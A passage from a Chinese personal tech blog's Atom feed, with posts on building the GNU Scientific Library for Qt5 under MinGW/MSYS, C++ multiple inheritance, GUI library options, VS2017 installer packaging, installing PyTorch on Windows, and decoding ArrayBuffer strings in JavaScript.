    <content type="html"><![CDATA[<p>GNU科学库（英语：GSL - GNU Scientific Library），是一套为 C语言和 C++开发者提供的数值计算函数库，多用于应用数学和科学。软件属于自由软件，在 GNU 通用公共许可证下发布。</p><p>这套数值计算函数库提供了大量的数学运算功能，比如随机数生成器，特殊函数以及最小二乘拟合。有超过1000个函数包含在该数值计算库和扩展的测试包中。</p><p>下面介绍在Qt5环境中搭载GSL库的方法和步骤。</p><h1 id="下载并安装Qt5"><a href="#下载并安装Qt5" class="headerlink" title="下载并安装Qt5"></a>下载并安装Qt5</h1><p>下载Qt5请参考<a href="http://c.biancheng.net/view/3851.html" target="_blank" rel="noopener">Qt下载（多种下载通道+所有版本）</a>。<strong>将下载并安装Qt5.9.8 LTS。</strong></p><p>安装Qt5请参考<a href="http://c.biancheng.net/view/3858.html" target="_blank" rel="noopener">图解Qt安装（Windows平台）</a>。</p><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><h2 id="MinGW环境配置"><a href="#MinGW环境配置" class="headerlink" title="MinGW环境配置"></a>MinGW环境配置</h2><p>MinGW（Minimalist GNU for Windows），又称mingw32，是将GCC编译器和GNU Binutils移植到Win32平台下的产物，包括一系列头文件（Win32API）、库和可执行文件。</p><p>另有可用于产生32位及64位Windows可执行文件的MinGW-w64项目，是从原本MinGW产生的分支。如今已经独立发展。</p><p>MinGW是从Cygwin（1.3.3版）基础上发展而来。Qt5.9.8使用MinGW 5.3编译器编译程序。</p><p>将mingw的bin目录添加进系统的环境变量，告诉系统已经安装了mingw编译器，并且可以被使用。Qt5自带的mingw的安装路径为C:\Qt\Qt5.9.8\5.9.8\mingw53_32，这里我们需要将C:\Qt\Qt5.9.8\5.9.8\mingw53_32\bin目录添加进入系统环境变量。</p><p>系统环境变量的设置方法为：【计算机】-&gt;【属性】-&gt;【高级系统设置】-&gt;【环境变量】-&gt;【系统变量】-&gt;【Path】。</p><h2 id="MSYS环境配置"><a href="#MSYS环境配置" class="headerlink" title="MSYS环境配置"></a>MSYS环境配置</h2><p>MSYS是bash，make，gawk和grep等GNU实用程序的集合，以允许构建依赖于传统UNIX工具的应用程序和程序。 它旨在补充MinGW和cmd shell的缺陷。</p><p>一个示例是构建一个使用自动工具构建系统的库。 用户通常会先运行“ ./configure”，然后运行“ make”来构建它。 配置外壳程序脚本需要Windows系统上不存在的外壳程序脚本解释器，但由MSYS提供。</p><p>一个常见的误解是MSYS是“ Windows上的UNIX”，MSYS本身不包含编译器或C库，因此不能将UNIX程序神奇地移植到Windows上，也不能提供任何特定于UNIX的功能，例如case- 敏感文件名。 寻找此类功能的用户应改用Cygwin或Microsoft的Interix。</p><p>msys的下载网址为：</p><p><a href="https://sourceforge.net/projects/mingwbuilds/files/external-binary-packages/" target="_blank" rel="noopener">msys+7za+wget+svn+git+mercurial+cvs-rev13.7z</a></p><p>上述网址给出的是一个压缩包，直接解压就可以使用。</p><p>将msys+7za+wget+svn+git+mercurial+cvs-rev13.7z解压到C:\Qt\Qt5.9.8\5.9.8\mingw53_32。</p><p>仅将msys解压后并不能直接使用，因为对于msys而言，它还不知道mingw编译器所处位置，因此需要对msys的环境进行配置。首先需要在msys的路径下创建一个名为mingw的空文件夹，路径为C:\Qt\Qt5.9.8\5.9.8\mingw53_32\msys\mingw。然后修改<br>C:\Qt\Qt5.9.8\5.9.8\mingw53_32\msys\etc\fstab中的内容,如下所示。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:/Qt/Qt5.9.8/Tools/mingw530_32 /mingw</span><br></pre></td></tr></table></figure><p>通过上述环境配置，当启动msys时，将Qt5的mingw编译直接挂载到/mingw目录下。</p><p>双击msys文件夹下msys.bat即可运行msys，使用cd命令进入/mingw目录下，我们就会发现此目录下文件就是C:\Qt\Qt5.9.8\Tools\mingw530_32对应的文件。</p><p>跳转到gsl-2.6文件夹，即可开始编译链接gsl。</p><h1 id="下载并编译安装GSL"><a href="#下载并编译安装GSL" class="headerlink" title="下载并编译安装GSL"></a>下载并编译安装GSL</h1><p>从此处 <a href="http://ftpmirror.gnu.org/gsl/" target="_blank" rel="noopener">http://ftpmirror.gnu.org/gsl/</a> 下载最新的GSL-2.6。然后采用如下步骤编译GSL：</p><ol><li>运行msys，进入GSL源文件所在目录</li><li>./configure</li><li>make -j8</li><li>make install</li></ol><h1 id="Qt调用GSL库"><a href="#Qt调用GSL库" class="headerlink" title="Qt调用GSL库"></a>Qt调用GSL库</h1><h2 id="创建Qt工程"><a href="#创建Qt工程" class="headerlink" title="创建Qt工程"></a>创建Qt工程</h2><p>为了测试GSL数学库能够在Qt环境中运行，新建一个控制台工程进行测试。</p><p>新建控制台应用程序的步骤为：【Welcome】-&gt;【New Project】-&gt;【Application】-&gt;【Qt Console Application】-&gt;【Choose】-&gt;【将工程命名为GslTest】。</p><h2 id="引用GSL库"><a href="#引用GSL库" class="headerlink" title="引用GSL库"></a>引用GSL库</h2><p>在GslTest项目的工程目录内，新建名为gsl的文件夹。该文件夹的内容如图1所示。</p><p></p><p align="center">    <img src="images/gsl.jpg" width="60%" alt="gsl文件夹结构"></p><p></p><center>图1 gsl文件夹结构</center><p>gsl文件夹下lib、include、bin中内容为编译安装GSL过程中生成的头文件、库文件及生成的相关exe文件，主要从C:\Qt\Qt5.9.8\5.9.8\mingw53_32\msys路径下提取。</p><p>此外，在gsl目录下新建gsl.pro文件，其内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 宏定义项，指明采用GSL，因为有些函数需要使用dll</span><br><span class="line">DEFINES += GSL_DLL</span><br><span class="line">INCLUDEPATH += $$PWD\include</span><br><span class="line">LIBS += -L$$PWD\lib -llibgsl</span><br><span class="line">LIBS += -L$$PWD\lib -llibgslcblas</span><br></pre></td></tr></table></figure><p>然后在GslTest的项目文件GslTest.pro末尾引用gsl.pro文件，如下所示。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include($$PWD/gsl/gsl.pro)</span><br></pre></td></tr></table></figure><h2 id="修改GslTest的main-cpp"><a href="#修改GslTest的main-cpp" class="headerlink" title="修改GslTest的main.cpp"></a>修改GslTest的main.cpp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;QCoreApplication&gt;</span><br><span class="line">#include &lt;gsl/gsl_sf_bessel.h&gt;</span><br><span class="line">#include &lt;math.h&gt;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    QCoreApplication a(argc, argv);</span><br><span class="line">    double x=10.0;</span><br><span class="line">    double y=gsl_sf_bessel_J0(x);</span><br><span class="line">    std::cout&lt;&lt;&quot;J0(&quot;&lt;&lt;x&lt;&lt;&quot;)=&quot;&lt;&lt;y&lt;&lt;std::endl;</span><br><span class="line"></span><br><span class="line">    return a.exec();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="运行GslTest"><a href="#运行GslTest" class="headerlink" title="运行GslTest"></a>运行GslTest</h2><p></p><p align="center">    <img src="images/result.jpg" width="60%" alt="GslTest运行结果"></p><p></p><center>图2 GslTest运行结果</center><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="http://c.biancheng.net/view/3851.html" target="_blank" rel="noopener">Qt下载（多种下载通道+所有版本）</a>,by C语言中文网.</li><li><a href="http://c.biancheng.net/view/3858.html" target="_blank" rel="noopener">图解Qt安装（Windows平台）</a>,by C语言中文网.</li><li><a href="http://www.gnu.org/software/gsl/" target="_blank" rel="noopener">GSL - GNU Scientific Library</a>,by gnu.</li><li><a href="https://blog.csdn.net/xiaop5140/article/details/76712413" target="_blank" rel="noopener">QT5环境下配置GSL数学库</a>,by 木小猿.</li><li><a href="https://zh.wikipedia.org/wiki/GNU%E7%A7%91%E5%AD%A6%E5%BA%93" target="_blank" rel="noopener">GNU科学库</a>,by wikipedia.</li><li><a href="https://blog.csdn.net/chenguolinblog/article/details/8164632" target="_blank" rel="noopener">【ICPC-455】C++ 常用数学函数库</a>,by 陈国林.</li><li><a href="https://zh.wikipedia.org/wiki/MinGW" target="_blank" rel="noopener">MinGW</a>,by wikipedia.</li><li><a href="https://blog.csdn.net/FreeApe/article/details/50555003" target="_blank" rel="noopener">MinGW和MSYS区别和关系以及MinGW&amp;MSYS在Win7中安装并编译x264</a>,by FreeApe.</li><li><a href="https://blog.csdn.net/czyt1988/article/details/39178975" target="_blank" rel="noopener">最强数学库GSL(GNU Scientific Library) Qt环境下部署</a>,by 尘中远.</li><li><a href="https://blog.csdn.net/KirkSong/article/details/80874766" target="_blank" rel="noopener">Qt5.9.6使用MSVC（VS2017）开发环境搭建</a>,by KirkSong.</li><li><a href="https://dlonng.com/posts/qt-osg" target="_blank" rel="noopener">QT - OSG 开发环境配置</a>,by 程序小哥.</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;GNU科学库（英语：GSL - GNU Scientific Library），是一套为 C语言和 C++开发者提供的数值计算函数库，多用于应用数学和科学。软件属于自由软件，在 GNU 通用公共许可证下发布。&lt;/p&gt;
&lt;p&gt;这套数值计算函数库提供了大量的数学运算功能，比如随
      
    
    </summary>
    
    
      <category term="笔记本" scheme="https://huangwang.github.io/tags/%E7%AC%94%E8%AE%B0%E6%9C%AC/"/>
    
      <category term="C/C++" scheme="https://huangwang.github.io/tags/C-C/"/>
    
      <category term="Qt" scheme="https://huangwang.github.io/tags/Qt/"/>
    
  </entry>
  
  <entry>
    <title>C++多继承的优缺点</title>
    <link href="https://huangwang.github.io/2019/10/05/CPlusPlus%E5%A4%9A%E7%BB%A7%E6%89%BF%E7%9A%84%E4%BC%98%E7%BC%BA%E7%82%B9/"/>
    <id>https://huangwang.github.io/2019/10/05/CPlusPlus多继承的优缺点/</id>
    <published>2019-10-05T13:21:47.000Z</published>
    <updated>2019-10-05T13:40:20.160Z</updated>
    
    <content type="html"><![CDATA[<p>C++中子类可继承多个父类。多继承对父类的个数没有限制，继承方式可以是公共继承、保护继承和私有继承，不写继承方式，默认是private继承。C++多继承语法非常灵活，使用得当可极大提高编程效率，但同时不能其潜在的缺点：</p><ul><li>如果一个类继承多个父类，如果父类中的方法名如果相同，那么就会产生歧义。</li><li>如果父类中的方法同名，子类中没有覆盖，同样会产生上面的错误。</li></ul><p>针对上述缺点，C#和Java中都不支持类多继承，而是使用类单继承和接口多继承设计替代类多继承。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://www.cnblogs.com/leotsai/p/csharp-multi-inheritance.html" target="_blank" rel="noopener">论C#之多继承</a>,by Leo.</li><li><a href="https://www.zhihu.com/question/20149818" target="_blank" rel="noopener">接口和抽象类有什么区别？</a>,by zhihu.</li><li><a href="https://blog.csdn.net/fengzijinliang/article/details/51439368" target="_blank" rel="noopener">java类单继承，接口多继承设计的原因</a>,by xiaoxiang-chen.</li><li><a href="https://blog.csdn.net/hudfang/article/details/50556277" target="_blank" rel="noopener">C++学习之继承篇（多继承与多重继承）</a>,by hudfang.</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;C++中子类可继承多个父类。多继承对父类的个数没有限制，继承方式可以是公共继承、保护继承和私有继承，不写继承方式，默认是private继承。C++多继承语法非常灵活，使用得当可极大提高编程效率，但同时不能其潜在的缺点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果一个类继承多个父类，如果
      
    
    </summary>
    
    
      <category term="笔记本" scheme="https://huangwang.github.io/tags/%E7%AC%94%E8%AE%B0%E6%9C%AC/"/>
    
      <category term="C/C++" scheme="https://huangwang.github.io/tags/C-C/"/>
    
  </entry>
  
  <entry>
    <title>GUI开发方案总结</title>
    <link href="https://huangwang.github.io/2019/10/03/GUI%E5%BC%80%E5%8F%91%E6%96%B9%E6%A1%88%E6%80%BB%E7%BB%93/"/>
    <id>https://huangwang.github.io/2019/10/03/GUI开发方案总结/</id>
    <published>2019-10-03T10:05:31.000Z</published>
    <updated>2019-10-04T05:27:56.629Z</updated>
    
    <content type="html"><![CDATA[<p>最近调研GUI开发技术，对相关资料总结一下。</p><h1 id="Windows-下的-GUI-库"><a href="#Windows-下的-GUI-库" class="headerlink" title="Windows 下的 GUI 库"></a>Windows 下的 GUI 库</h1><p>Windows 下的 GUI 解决方案比较多：</p><ul><li>基于 C++ 的有 Qt、MFC、WTL、wxWidgets、DirectUI、Htmlayout；</li><li>基于 C# 的有 WinForm、WPF；</li><li>基于 Java 的有 AWT、Swing；</li><li>基于 Pascal 的 有Delphi；</li><li>基于Go语言的有 walk 和 electron；</li><li>还有国内初露头角的 aardio；</li><li>Visual Basic 曾经很流行，现在逐渐失去了色彩；</li><li>如果你有 Web 开发经验，也可以基于 Webkit 或 Chromium 将网页转换为桌面程序。</li></ul><p>没有哪一种方案能够独霸 Windows，使用比较多的编程语言是 C++、C#、Java。</p><h1 id="Linux-下的-GUI-库"><a href="#Linux-下的-GUI-库" class="headerlink" title="Linux 下的 GUI 库"></a>Linux 下的 GUI 库</h1><p>Linux 下常用的 GUI 库有基于 C++ 的 Qt、GTK+、wxWidgets，以及基于 Java 的 AWT 和 Swing。其中最著名的就是 Qt 和 GTK+：KDE 桌面系统已经将 Qt 作为默认的 GUI 库，Gnome 桌面系统也将 GTK+ 作为默认的 GUI 库。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="http://c.biancheng.net/view/3876.html" target="_blank" rel="noopener">Qt和其它GUI库的对比</a>,by C语言中文网.</li><li><a href="https://zh.wikipedia.org/wiki/Qt" target="_blank" rel="noopener">Qt</a>,by wikipedia.</li><li><a href="http://c.biancheng.net/view/3851.html" target="_blank" rel="noopener">Qt下载（多种下载通道+所有版本）</a>,by C语言中文网.</li><li><a href="http://mirrors.ustc.edu.cn/qtproject/" target="_blank" rel="noopener">Qt镜像站下载</a>,by 中科大镜像站.</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近调研GUI开发技术，对相关资料总结一下。&lt;/p&gt;
&lt;h1 id=&quot;Windows-下的-GUI-库&quot;&gt;&lt;a href=&quot;#Windows-下的-GUI-库&quot; class=&quot;headerlink&quot; title=&quot;Windows 下的 GUI 库&quot;&gt;&lt;/a&gt;Windows 
      
    
    </summary>
    
    
      <category term="笔记本" scheme="https://huangwang.github.io/tags/%E7%AC%94%E8%AE%B0%E6%9C%AC/"/>
    
      <category term="C/C++" scheme="https://huangwang.github.io/tags/C-C/"/>
    
  </entry>
  
  <entry>
    <title>VS2017打包Windows桌面程序</title>
    <link href="https://huangwang.github.io/2019/09/26/VS2017%E6%89%93%E5%8C%85Windows%E6%A1%8C%E9%9D%A2%E7%A8%8B%E5%BA%8F/"/>
    <id>https://huangwang.github.io/2019/09/26/VS2017打包Windows桌面程序/</id>
    <published>2019-09-26T04:37:33.000Z</published>
    <updated>2019-10-03T07:56:02.780Z</updated>
    
    <content type="html"><![CDATA[<p>Microsoft Visual Studio 2017 Installer Projects是一个易于发布 VS 项目的官方插件，下面简要介绍该插件的使用。</p><h1 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h1><p>VS 工具栏 &gt; 工具 &gt; 扩展和更新 &gt; 联机 &gt; 搜索 Microsoft Visual Studio 2017 Installer Projects 并安装。安装完成后需要重启 VS。</p><h1 id="添加-Setup-Project"><a href="#添加-Setup-Project" class="headerlink" title="添加 Setup Project"></a>添加 Setup Project</h1><p>打开VS2017，新建Setup Project。</p><h1 id="配置安装项目"><a href="#配置安装项目" class="headerlink" title="配置安装项目"></a>配置安装项目</h1><h2 id="设置Setup-Project"><a href="#设置Setup-Project" class="headerlink" title="设置Setup Project"></a>设置Setup Project</h2><p>选中添加的Setup Project，配置其属性。比较重要的属性有：</p><div class="table-container"><table><thead><tr><th>key</th><th>val</th></tr></thead><tbody><tr><td>Author</td><td>一般填公司名，会使用其作为软件安装目录名</td></tr><tr><td>Localization</td><td>指定软件运行地语种，如果你的软件是多语言的话</td></tr><tr><td>TargetPlatform</td><td>指定软件目标平台 x86 or x64</td></tr><tr><td>Version</td><td>发布版本号</td></tr></tbody></table></div><h2 id="桌面快捷方式"><a href="#桌面快捷方式" class="headerlink" title="桌面快捷方式"></a>桌面快捷方式</h2><h2 id="开始菜单快捷方式"><a href="#开始菜单快捷方式" class="headerlink" title="开始菜单快捷方式"></a>开始菜单快捷方式</h2><h2 id="设置快捷方式Icon"><a href="#设置快捷方式Icon" class="headerlink" title="设置快捷方式Icon"></a>设置快捷方式Icon</h2><h2 id="生成安装文件-msi"><a href="#生成安装文件-msi" class="headerlink" title="生成安装文件.msi"></a>生成安装文件.msi</h2><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://www.jianshu.com/p/514fc27d8bf3" target="_blank" rel="noopener">Microsoft Visual Studio 2017 Installer Projects</a>,by SkyRiN.</li><li><a href="https://blog.csdn.net/jxyb2012/article/details/83009765" target="_blank" rel="noopener">Vistual Studio Community 2017 30天许可证过期</a>,by 井底一蛤蟆.</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Microsoft Visual Studio 2017 Installer Projects是一个易于发布 VS 项目的官方插件，下面简要介绍该插件的使用。&lt;/p&gt;
&lt;h1 id=&quot;安装插件&quot;&gt;&lt;a href=&quot;#安装插件&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Windows下安装Pytorch过程记录</title>
    <link href="https://huangwang.github.io/2019/09/24/Windows%E4%B8%8B%E5%AE%89%E8%A3%85Pytorch%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/"/>
    <id>https://huangwang.github.io/2019/09/24/Windows下安装Pytorch过程记录/</id>
    <published>2019-09-24T12:56:20.000Z</published>
    <updated>2019-09-24T14:02:11.547Z</updated>
    
    <content type="html"><![CDATA[<p>PyTorch是一个开源的Python机器学习库，基于Torch，底层由C++实现，应用于人工智能领域，如自然语言处理。它最初由Facebook的人工智能研究团队开发，并且被用于Uber的概率编程软件Pyro。</p><p>PyTorch主要有两大特征：</p><ul><li>类似于NumPy的张量计算，可使用GPU加速;</li><li>基于带自动微分系统的深度神经网络;</li></ul><p>下面记录在Windows操作系统下安装PyTorch的方法。</p><h1 id="安装Anaconda"><a href="#安装Anaconda" class="headerlink" title="安装Anaconda"></a>安装Anaconda</h1><p>到<a href="https://www.anaconda.com/distribution/" target="_blank" rel="noopener">Anaconda Distribution</a>下载合适的Anaconda。</p><h1 id="查看cuda版本"><a href="#查看cuda版本" class="headerlink" title="查看cuda版本"></a>查看cuda版本</h1><p>参考<a href="https://www.jianshu.com/p/d3b9419a0f89" target="_blank" rel="noopener">Windows系统查看CUDA版本号</a>。例如本机cuda版本为9.2。</p><h1 id="安装pytorch"><a href="#安装pytorch" class="headerlink" title="安装pytorch"></a>安装pytorch</h1><p>进入pytorch官网的<a href="https://pytorch.org/get-started/locally/" target="_blank" rel="noopener">GET STARTED</a>，根据自身计算机环境，选择PyTorch Build、Your OS、Package、Language和CUDA，即得到安装pytorch的命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 基于Anaconda</span><br><span class="line">conda install pytorch torchvision cudatoolkit=9.2 -c pytorch -c defaults -c numba/label/dev</span><br><span class="line">// 基于Python3.6</span><br><span class="line">pip3 install torch==1.2.0+cu92 torchvision==0.4.0+cu92 -f https://download.pytorch.org/whl/torch_stable.html</span><br></pre></td></tr></table></figure><h2 id="pip安装whl包"><a href="#pip安装whl包" class="headerlink" title="pip安装whl包"></a>pip安装whl包</h2><p>torch1.2的包很大，直接用pip安装下载很慢，可以先用下载工具将torch1.2的whl下载下来，再直接安装。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install torch-1.2.0+cu92-cp36-cp36m-win_amd64.whl</span><br></pre></td></tr></table></figure><h1 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h1><p>打开命令提示符，输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python</span><br></pre></td></tr></table></figure><p>输入如下代码，查看输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from __future__ import print_function</span><br><span class="line">import torch</span><br><span class="line">x = torch.rand(5, 3)</span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure><p>输出类似如下结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tensor([[0.3380, 0.3845, 0.3217],</span><br><span class="line">        [0.8337, 0.9050, 0.2650],</span><br><span class="line">        [0.2979, 0.7141, 0.9069],</span><br><span class="line">        [0.1449, 0.1132, 0.1375],</span><br><span class="line">        [0.4675, 0.3947, 0.1426]])</span><br></pre></td></tr></table></figure><p>输入如下代码，验证GPU驱动和CUDA是安装正确，能够被PyTorch访问：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import torch</span><br><span class="line">torch.cuda.is_available()</span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://zh.wikipedia.org/wiki/CUDA" target="_blank" rel="noopener">CUDA</a>,by wikipedia.</li><li><a href="https://blog.csdn.net/lvsehaiyang1993/article/details/84890949" target="_blank" rel="noopener">Windows 下安装Pytorch</a>,by Big_quant.</li><li><a href="https://www.jianshu.com/p/d3b9419a0f89" target="_blank" rel="noopener">Windows系统查看CUDA版本号</a>,by 潇洒坤.</li><li><a href="https://zh.wikipedia.org/zh-cn/PyTorch" target="_blank" rel="noopener">PyTorch</a>,by wikipedia.</li><li><a href="https://pytorch.org/get-started/locally/" target="_blank" rel="noopener">GET STARTED</a>,by pytorch.</li><li><a href="https://code.visualstudio.com/docs/python/python-tutorial" target="_blank" rel="noopener">Getting Started with Python in VS Code</a>,by visualstudio.</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;PyTorch是一个开源的Python机器学习库，基于Torch，底层由C++实现，应用于人工智能领域，如自然语言处理。它最初由Facebook的人工智能研究团队开发，并且被用于Uber的概率编程软件Pyro。&lt;/p&gt;
&lt;p&gt;PyTorch主要有两大特征：&lt;/p&gt;
&lt;ul&gt;
      
    
    </summary>
    
    
      <category term="笔记本" scheme="https://huangwang.github.io/tags/%E7%AC%94%E8%AE%B0%E6%9C%AC/"/>
    
      <category term="机器学习" scheme="https://huangwang.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>JS如何从ArrayBuffer中解码字符串</title>
    <link href="https://huangwang.github.io/2019/09/24/JS%E5%A6%82%E4%BD%95%E4%BB%8EArrayBuffer%E4%B8%AD%E8%A7%A3%E7%A0%81%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    <id>https://huangwang.github.io/2019/09/24/JS如何从ArrayBuffer中解码字符串/</id>
    <published>2019-09-24T09:37:25.000Z</published>
    <updated>2019-09-24T10:41:52.844Z</updated>
    
    <content type="html"><![CDATA[<p>最近遇到一个问题，拿到一个ArrayBuffer，知道它是以gb2312编码的文档，那么如何使用javascript从中解码出字符串。下面介绍常用的解决方案。</p><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="字符编码"><a href="#字符编码" class="headerlink" title="字符编码"></a>字符编码</h2><p>字符编码（英语：Character encoding）、字集码是把字符集中的字符编码为指定集合中某一对象（例如：比特模式、自然数序列、8位组或者电脉冲），以便文本在计算机中存储和通过通信网络的传递。常见的例子包括将拉丁字母表编码成摩斯电码和ASCII。其中，ASCII将字母、数字和其它符号编号，并用7比特的二进制来表示这个整数。通常会额外使用一个扩充的比特，以便于以1个字节的方式存储。</p><p>因此，如果不知道字符存储的编码方案，那么只能得到一堆无意义的数字，无法从中解码出正确的字符信息。</p><h2 id="ArrayBuffer"><a href="#ArrayBuffer" class="headerlink" title="ArrayBuffer"></a>ArrayBuffer</h2><p>ArrayBuffer对象、TypedArray对象、DataView对象是JavaScript操作二进制数据的一个接口。这些对象早就存在，属于独立的规格，ES6将它们纳入了ECMAScript规格，并且增加了新的方法。</p><p>这些对象原始的设计目的，与WebGL项目有关。所谓WebGL，就是指浏览器与显卡之间的通信接口，为了满足JavaScript与显卡之间大量的、实时的数据交换，它们之间的数据通信必须是二进制的，而不能是传统的文本格式。文本格式传递一个32位整数，两端的JavaScript脚本与显卡都要进行格式转化，将非常耗时。这时要是存在一种机制，可以像C语言那样，直接操作字节，将4个字节的32位整数，以二进制形式原封不动地送入显卡，脚本的性能就会大幅提升。</p><p>二进制数组就是在这种背景下诞生的。它很像C语言的数组，允许开发者以数组下标的形式，直接操作内存，大大增强了JavaScript处理二进制数据的能力，使得开发者有可能通过JavaScript与操作系统的原生接口进行二进制通信。</p><p>二进制数组由三个对象组成。</p><ul><li><p>ArrayBuffer对象：代表内存之中的一段二进制数据，可以通过“视图”进行操作。“视图”部署了数组接口，这意味着，可以用数组的方法操作内存。</p></li><li><p>TypedArray对象：用来生成内存的视图，通过9个构造函数，可以生成9种数据格式的视图，比如Uint8Array（无符号8位整数）数组视图, Int16Array（16位整数）数组视图, Float32Array（32位浮点数）数组视图等等。</p></li><li><p>DataView对象：用来生成内存的视图，可以自定义格式和字节序，比如第一个字节是Uint8（无符号8位整数）、第二个字节是Int16（16位整数）、第三个字节是Float32（32位浮点数）等等。</p></li></ul><p>简单说，ArrayBuffer对象代表原始的二进制数据，TypedArray对象代表确定类型的二进制数据，DataView对象代表不确定类型的二进制数据。它们支持的数据类型一共有9种（DataView对象支持除Uint8C以外的其他8种）。</p><h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><h2 id="UTF-16的编码解码"><a href="#UTF-16的编码解码" class="headerlink" title="UTF-16的编码解码"></a>UTF-16的编码解码</h2><p>下面的解决方案只能解码UTF-16编码的字符串，而且当ArrayBuffer的长度过大时，会报“ Maximum call stack size exceeded”的错误。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function ab2str(buf) &#123;</span><br><span class="line">  return String.fromCharCode.apply(null, new Uint16Array(buf));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function str2ab(str) &#123;</span><br><span class="line">  var buf = new ArrayBuffer(str.length*2); // 2 bytes for each char</span><br><span class="line">  var bufView = new Uint16Array(buf);</span><br><span class="line">  for (var i=0, strLen=str.length; i &lt; strLen; i++) &#123;</span><br><span class="line">    bufView[i] = str.charCodeAt(i);</span><br><span class="line">  &#125;</span><br><span class="line">  return buf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="gb2312解码"><a href="#gb2312解码" class="headerlink" title="gb2312解码"></a>gb2312解码</h2><p>下面的解决方案能解码指定编码的字符串，包括utf-8，utf-16, iso-8859-2, koi8, cp1261, and gbk等。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function ab2str(arrayBuf, encodeType) &#123;</span><br><span class="line">  var decoder = new TextDecoder(encodeType)</span><br><span class="line">  var u8arr = new Uint8Array(arrayBuf)</span><br><span class="line">  return decoder.decode(u8arr)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://developers.google.com/web/updates/2012/06/How-to-convert-ArrayBuffer-to-and-from-String" target="_blank" rel="noopener">How to convert ArrayBuffer to and from String</a>,by Renato Mangini.</li><li><a href="https://zh.wikipedia.org/wiki/%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81" target="_blank" rel="noopener">字符编码</a>,by wikipedia.</li><li><a href="https://stackoverflow.com/questions/38432611/converting-arraybuffer-to-string-maximum-call-stack-size-exceeded" target="_blank" rel="noopener">Converting arraybuffer to string : Maximum call stack size exceeded</a>,by stackoverflow.</li><li><a href="https://stackoverflow.com/questions/22123769/rangeerror-maximum-call-stack-size-exceeded-why" target="_blank" rel="noopener">“RangeError: Maximum call stack size exceeded” Why?</a>,by stackoverflow.</li><li><a 